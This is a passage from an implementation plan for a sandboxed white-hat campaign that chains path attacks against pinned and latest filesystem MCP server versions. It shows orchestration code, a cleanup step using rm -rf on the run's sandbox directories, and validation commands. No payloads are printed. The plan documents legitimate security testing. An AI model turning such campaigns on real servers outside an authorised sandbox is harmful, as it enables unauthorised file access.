            }, default=repr) + "\n")
```

- [ ] **Step 2: Add a final-cleanup helper**

```python
def final_cleanup() -> None:
    """Best-effort: remove all sandbox and victim dirs created by this run."""
    script = " && ".join(
        f"rm -rf {SANDBOXES[v]!r} {VICTIMS[v]!r} {SANDBOXES[v]}_evil {SANDBOXES[v]}_indirect"
        for v in SANDBOXES
    )
    try:
        wsl_bash(script, check=False, timeout=15)
    except Exception as exc:
        print(f"[cleanup warning] {exc}")
```

- [ ] **Step 3: Write the real `main()`**

```python
def main() -> None:
    REPORTS_DIR.mkdir(parents=True, exist_ok=True)
    t0 = time.monotonic()
    try:
        print("=" * 60)
        print("FS MCP Attack Chains Campaign")
        print("=" * 60)

        # Phase 0 — source notes to disk (from the hardcoded data)
        write_source_notes()
        print(f"[Phase 0] wrote {NOTES_OUT}")

        wipe_all()

        # Phase 1 — recon
        recon_results = run_recon_phase()

        # Phase 2 — primitives
        primitive_results = run_primitives_phase()

        # Phase 3 — attack chains
        chain_results = run_chains_phase(CHAINS)

        all_results = recon_results + primitive_results + chain_results

        # Phase 4/5 — diff & PoCs (handled inside the Excel writer)
        write_excel(recon_results, primitive_results, chain_results)
        write_jsonl(all_results)

        # Summary to stdout
        totals: dict[str, int] = {}
        for r in all_results:
            totals[r.severity] = totals.get(r.severity, 0) + 1
        print("\n" + "=" * 60)
        print(f"Completed in {time.monotonic() - t0:.1f}s")
        print(f"Total steps: {len(all_results)}")
        for sev in SEVERITY_ORDER:
            print(f"  {sev:>8}: {totals.get(sev, 0)}")
    finally:
        final_cleanup()
```

- [ ] **Step 4: Add gitignore entry for the JSONL audit log**

Append to `.gitignore`:

```
tests/testbed/excel_reports/fs_attack_chains.raw.jsonl
```

- [ ] **Step 5: Commit**

```bash
git add tests/testbed/attack_fs_chains.py .gitignore
git commit -m "feat(testbed): main orchestration, jsonl audit, cleanup"
```

---

## Task 15: End-to-end validation

**Files:** none modified; this task runs the campaign and verifies outputs.

- [ ] **Step 1: Run the full campaign**

Run: `uv run python tests/testbed/attack_fs_chains.py`

Expected:
- Prints phase banners, per-step dots, final severity totals.
- Completes in under 10 minutes.
- Writes `tests/testbed/excel_reports/fs_attack_chains.xlsx`.
- Writes `tests/testbed/excel_reports/fs_attack_chains.source_notes.md`.
- Writes `tests/testbed/excel_reports/fs_attack_chains.raw.jsonl`.
- Final summary shows at least one CRITICAL or HIGH row on the pinned version (sanity check — the pinned version has documented CVEs, so the scorer should register at least one hit).

- [ ] **Step 2: Verify the Excel has 8 sheets and no crashes**

Run: `uv run python -c "import openpyxl; wb=openpyxl.load_workbook('tests/testbed/excel_reports/fs_attack_chains.xlsx'); print(wb.sheetnames)"`
Expected: prints `['01_Summary', '02_Source_Analysis', '03_Recon', '04_Primitives', '05_Chain_Steps', '06_Diff', '07_PoCs', '08_Raw']`.

- [ ] **Step 3: Open in Excel / LibreOffice and eyeball**

Open the xlsx manually. Verify:
- Summary sheet has 15 rows (one per chain) with colored severity fills.
- Chain_Steps sheet has ~60-100 rows.
- Raw sheet has every step.
- Red fills appear on any CRITICAL rows.

- [ ] **Step 4: Confirm no writes happened outside `/tmp`**

Run: `wsl bash -lc "find /etc /root /home /var -newer /tmp/mcp_attack_328 -type f 2>/dev/null | head -5"`
Expected: empty output (no files outside `/tmp` were modified during the run).

- [ ] **Step 5: Confirm no stray processes**

Run: `wsl bash -lc "pgrep -af 'server-filesystem' || echo none"`
Expected: `none` — no zombie server processes are left running.

- [ ] **Step 6: Commit the generated report (xlsx + md, not jsonl)**

```bash
git add tests/testbed/excel_reports/fs_attack_chains.xlsx tests/testbed/excel_reports/fs_attack_chains.source_notes.md
git commit -m "chore(testbed): first campaign run artifacts"
```

---

## Task 16: Docs sync

**Files:**
- Modify: `tests/testbed/GUIDE.md` (existing file per git status)

- [ ] **Step 1: Append a section describing the new campaign**

Add to `tests/testbed/GUIDE.md`:

```markdown
## Filesystem Attack Chains

`attack_fs_chains.py` runs a 15-chain white-hat attack campaign against
both pinned (v2025.3.28) and latest (v2025.7.29) filesystem MCP servers
using only `read_file` and `list_directory`. It prints a per-severity
summary to stdout and writes:

- `excel_reports/fs_attack_chains.xlsx` (8-sheet comparative report)
- `excel_reports/fs_attack_chains.source_notes.md` (Phase 0 analysis)
- `excel_reports/fs_attack_chains.raw.jsonl` (audit log, git-ignored)

Run: `uv run python tests/testbed/attack_fs_chains.py`
Runtime: under 10 minutes.
Spec: `docs/superpowers/specs/2026-04-10-fs-attack-chains-design.md`
```

- [ ] **Step 2: Commit**

```bash
git add tests/testbed/GUIDE.md
git commit -m "docs(testbed): document fs attack chains campaign"
```

---

## Self-Review Checklist

**Spec coverage:**
- Phase 0 (source analysis) → Task 7 ✓
- Phase 1 (recon) → Task 8 ✓
- Phase 2 (primitives) → Task 9 ✓
- Phase 3 (chains C1-C15) → Tasks 10, 11, 12 ✓
- Phase 4 (diff) → Task 13 (`_sheet_diff`) ✓
- Phase 5 (PoCs) → Task 13 (`_sheet_pocs`) ✓
- Safety rules (sandbox isolation, canary, 5min/version budget, process cleanup) → Tasks 3, 14 ✓
- 8-sheet Excel layout → Task 13 ✓
- Hit detection rules → Task 4 (`classify_hit`) ✓
- Three output files → Task 14 ✓

**Placeholder scan:**
- One intentional placeholder remains in `SOURCE_NOTES` (Task 7 Step 2) — Task 7 explicitly instructs the engineer to read both `index.js` files and replace the scaffold entries with real findings before proceeding. This is a plan checkpoint, not a plan failure, and Task 7's text calls it out as a failure condition if left unfilled.
- No other TODO/TBD markers.

**Type consistency:**
- `StepCall` → `StepResult` → Excel writer: field names match (`chain_id`, `step_num`, `pinned_response`, `pinned_elapsed_ms`, `severity`, `reason`, `is_regression`, `pre_setup`, `path_repr`, `label`).
- `classify_hit` returns `(severity, reason, is_regression)` — matches the unpacking in `run_calls_both_versions`.
- `Chain.setup` / `Chain.calls` are callables — matches how `run_chains_phase` invokes them.
- `render_path` handles non-strings — matches `StepCall.path: Any` for type confusion cases.
- `SEVERITY_ORDER` matches all severities emitted by `classify_hit`.

No issues found.
